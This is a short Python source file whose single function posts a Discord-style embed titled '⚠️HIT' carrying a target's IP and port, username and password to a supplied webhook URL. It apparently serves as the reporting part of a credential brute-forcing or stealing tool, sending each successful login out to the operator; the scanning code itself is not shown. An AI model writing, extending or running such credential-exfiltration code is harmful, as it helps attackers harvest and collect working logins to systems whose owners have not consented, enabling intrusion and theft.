import requests
import json


def webhook(url: str, ip: str, port: str, username: str, password: str):
    payload = json.dumps(
        {
            "content": None,
            "embeds": [
                {
                    "title": "⚠️HIT",
                    "color": 16711680,
                    "fields": [
                        {"name": "IP", "value": f"{ip}:{port}"},
                        {"name": "username", "value": username},
                        {"name": "password", "value": password},
                    ],
                }
            ],
            "attachments": [],
        }
    )
    headers = {
        "Content-Type": "application/json",
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    print(response.text)
